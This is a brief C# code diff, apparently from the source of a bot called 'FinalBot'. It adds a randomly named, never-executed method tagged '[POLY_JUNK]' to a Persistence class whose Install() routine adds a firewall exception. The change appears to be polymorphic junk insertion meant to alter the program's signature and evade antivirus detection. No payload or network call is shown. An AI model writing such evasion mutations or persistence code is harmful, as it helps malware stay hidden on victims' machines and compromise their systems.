@@ -8,6 +8,12 @@ namespace FinalBot
 {
     public static class Persistence
     {
+        // [POLY_JUNK]
+        private static void _vanguard_91b77046() {
+            int val = 36960;
+            if (val > 50000) Console.WriteLine("Hash:" + 36960);
+        }
+
         public static void Install()
         {
             AddFirewallException();
